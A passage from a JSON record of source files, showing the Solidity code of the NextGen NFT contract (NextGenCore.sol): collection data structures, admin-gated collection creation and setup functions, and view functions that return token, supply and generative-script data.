return(collectionAdditionalData[_collectionID].maxCollectionPurchases);\n    }\n\n    // function to return tokens minted per address during AL\n    function retrieveTokensMintedALPerAddress(uint256 _collectionID, address _address) external view returns(uint256) {\n        return (tokensMintedAllowlistAddress[_collectionID][_address]);\n    }\n\n    // function to return tokens minted per address during Public\n    function retrieveTokensMintedPublicPerAddress(uint256 _collectionID, address _address) external view returns(uint256) {\n        return (tokensMintedPerAddress[_collectionID][_address]);\n    }\n\n    // function to retrieve the airdrop/minted tokens per address \n\n    function retrieveTokensAirdroppedPerAddress(uint256 _collectionID, address _address) public view returns(uint256) {\n        return (tokensAirdropPerAddress[_collectionID][_address]);\n    }\n\n    // function to return the artist's address\n    function retrieveArtistAddress(uint256 _collectionID) external view returns(address) {\n        return (collectionAdditionalData[_collectionID].collectionArtistAddress);\n    }\n\n    // function to retrieve a Collection's Info\n\n    function retrieveCollectionInfo(uint256 _collectionID) public view returns(string memory, string memory, string memory, string memory, string memory, string memory){\n        return (collectionInfo[_collectionID].collectionName, collectionInfo[_collectionID].collectionArtist, collectionInfo[_collectionID].collectionDescription, collectionInfo[_collectionID].collectionWebsite, collectionInfo[_collectionID].collectionLicense, collectionInfo[_collectionID].collectionBaseURI);\n    }\n\n    // function to retrieve the library and script of a collection\n\n    function retrieveCollectionLibraryAndScript(uint256 _collectionID) public view returns(string memory, string[] memory){\n        return (collectionInfo[_collectionID].collectionLibrary, collectionInfo[_collectionID].collectionScript);\n    }\n\n    // function to retrieve the Additional data of a Collection\n\n    function retrieveCollectionAdditionalData(uint256 _collectionID) public view returns(address, uint256, uint256, uint256, uint, address){\n        return (collectionAdditionalData[_collectionID].collectionArtistAddress, collectionAdditionalData[_collectionID].maxCollectionPurchases, collectionAdditionalData[_collectionID].collectionCirculationSupply, collectionAdditionalData[_collectionID].collectionTotalSupply, collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint, collectionAdditionalData[_collectionID].randomizerContract);\n    }\n\n    // function to retrieve tokenHash\n\n    function retrieveTokenHash(uint256 _tokenid) public view returns(bytes32){\n        return (tokenToHash[_tokenid]);\n    }\n\n    // function to retrieve the Generative Script of a token\n\n    function retrieveGenerativeScript(uint256 tokenId) public view returns(string memory){\n        _requireMinted(tokenId);\n        string memory scripttext;\n        for (uint256 i=0; i < collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionScript.length; i++) {\n            scripttext = string(abi.encodePacked(scripttext, collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionScript[i])); \n        }\n        return string(abi.encodePacked(\"let hash='\",Strings.toHexString(uint256(tokenToHash[tokenId]), 32),\"';let tokenId=\",tokenId.toString(),\";let tokenData=[\",tokenData[tokenId],\"];\", scripttext));\n    }\n\n    // function to retrieve the supply of a collection\n\n    function totalSupplyOfCollection(uint256 _collectionID) public view returns (uint256) {\n        return (collectionAdditionalData[_collectionID].collectionCirculationSupply - burnAmount[_collectionID]);\n    }\n\n    // function to retrieve the token image uri and the attributes stored on-chain for a token id.\n\n    function retrievetokenImageAndAttributes(uint256 _tokenId) public view returns(string memory, string memory) {\n        return (tokenImageAndAttributes[_tokenId][0],tokenImageAndAttributes[_tokenId][1]);\n    }\n\n}"
    },
    {
      "filename": "hardhat/smart-contracts/NextGenCore.sol",
      "content": "// SPDX-License-Identifier: MIT\n\n/**\n *\n *  @title: NextGen Smart Contract\n *  @date: 19-October-2023 \n *  @version: 10.28\n *  @author: 6529 team\n */\n\npragma solidity ^0.8.19;\n\nimport \"./ERC721Enumerable.sol\";\nimport \"./Ownable.sol\";\nimport \"./Strings.sol\";\nimport \"./Base64.sol\";\nimport \"./IRandomizer.sol\";\nimport \"./INextGenAdmins.sol\";\nimport \"./IMinterContract.sol\";\nimport \"./ERC2981.sol\";\n\ncontract NextGenCore is ERC721Enumerable, Ownable, ERC2981 {\n    using Strings for uint256;\n\n    // declare variables\n    uint256 public newCollectionIndex;\n\n    // collectionInfo struct declaration\n    struct collectionInfoStructure {\n        string collectionName;\n        string collectionArtist;\n        string collectionDescription;\n        string collectionWebsite;\n        string collectionLicense;\n        string collectionBaseURI;\n        string collectionLibrary;\n        string[] collectionScript;\n    }\n\n    // mapping of collectionInfo struct\n    mapping (uint256 => collectionInfoStructure) private collectionInfo;\n\n    // collectionAdditionalData struct declaration\n    struct collectionAdditonalDataStructure {\n        address collectionArtistAddress;\n        uint256 maxCollectionPurchases;\n        uint256 collectionCirculationSupply;\n        uint256 collectionTotalSupply;\n        uint256 reservedMinTokensIndex;\n        uint256 reservedMaxTokensIndex;\n        uint setFinalSupplyTimeAfterMint;\n        address randomizerContract;\n        IRandomizer randomizer;\n    }\n\n    // mapping of collectionAdditionalData struct\n    mapping (uint256 => collectionAdditonalDataStructure) private collectionAdditionalData;\n\n    // other mappings\n\n    // checks if a collection was created\n    mapping (uint256 => bool) private isCollectionCreated; \n\n    // checks if data on a collection were added\n    mapping (uint256 => bool) private wereDataAdded;\n\n    // maps tokends ids with collectionsids\n    mapping (uint256 => uint256) private tokenIdsToCollectionIds;\n\n    // stores randomizer hash\n    mapping(uint256 => bytes32) private tokenToHash;\n\n    // minted tokens per address per collection during public sale\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedPerAddress;\n\n    // minted tokens per address per collection during allowlist\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedAllowlistAddress;\n\n    // tokens airdrop per address per collection \n    mapping (uint256 => mapping (address => uint256)) private tokensAirdropPerAddress;\n\n    // current amount of burnt tokens per collection\n    mapping (uint256 => uint256) public burnAmount;\n\n    // modify the metadata view\n    mapping (uint256 => bool) public onchainMetadata; \n\n    // artist signature per collection\n    mapping (uint256 => string) public artistsSignatures;\n\n    // tokens additional metadata\n    mapping (uint256 => string) public tokenData;\n\n    // on-chain token Image URI and attributes\n    mapping (uint256 => string[2]) private tokenImageAndAttributes;\n\n    // collectionFreeze \n    mapping (uint256 => bool) private collectionFreeze;\n\n    // artist signed\n    mapping (uint256 => bool) public artistSigned; \n\n    // external contracts declaration\n    INextGenAdmins private adminsContract;\n    address public minterContract;\n\n    // smart contract constructor\n    constructor(string memory name, string memory symbol, address _adminsContract) ERC721(name, symbol) {\n        adminsContract = INextGenAdmins(_adminsContract);\n        newCollectionIndex = newCollectionIndex + 1;\n        _setDefaultRoyalty(0x1B1289E34Fe05019511d7b436a5138F361904df0, 690);\n    }\n\n    // certain functions can only be called by a global or function admin\n\n    modifier FunctionAdminRequired(bytes4 _selector) {\n      require(adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true , \"Not allowed\");\n      _;\n    }\n\n    // certain functions can only be called by a collection, global or function admin\n\n    modifier CollectionAdminRequired(uint256 _collectionID, bytes4 _selector) {\n      require(adminsContract.retrieveCollectionAdmin(msg.sender,_collectionID) == true || adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true, \"Not allowed\");\n      _;\n    }\n\n    // function to create a Collection\n\n    function createCollection(string memory _collectionName, string memory _collectionArtist, string memory _collectionDescription, string memory _collectionWebsite, string memory _collectionLicense, string memory _collectionBaseURI, string memory _collectionLibrary, string[] memory _collectionScript) public FunctionAdminRequired(this.createCollection.selector) {\n        collectionInfo[newCollectionIndex].collectionName = _collectionName;\n        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;\n        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;\n        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;\n        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;\n        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;\n        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;\n        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;\n        isCollectionCreated[newCollectionIndex] = true;\n        newCollectionIndex = newCollectionIndex + 1;\n    }\n\n    // function to add/modify the additional data of a collection\n    // once a collection is created and total supply is set it cannot be changed\n    // only _collectionArtistAddress , _maxCollectionPurchases can change after total supply is set\n\n    function setCollectionData(uint256 _collectionID, address _collectionArtistAddress, uint256 _maxCollectionPurchases, uint256 _collectionTotalSupply, uint _setFinalSupplyTimeAfterMint) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false) && (_collectionTotalSupply <= 10000000000), \"err/freezed\");\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply == 0) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].collectionCirculationSupply = 0;\n            collectionAdditionalData[_collectionID].collectionTotalSupply = _collectionTotalSupply;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n            collectionAdditionalData[_collectionID].reservedMinTokensIndex = (_collectionID * 10000000000);\n            collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + _collectionTotalSupply - 1;\n            wereDataAdded[_collectionID] = true;\n        } else if (artistSigned[_collectionID] == false) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        } else {\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAft"
    }
  ]
}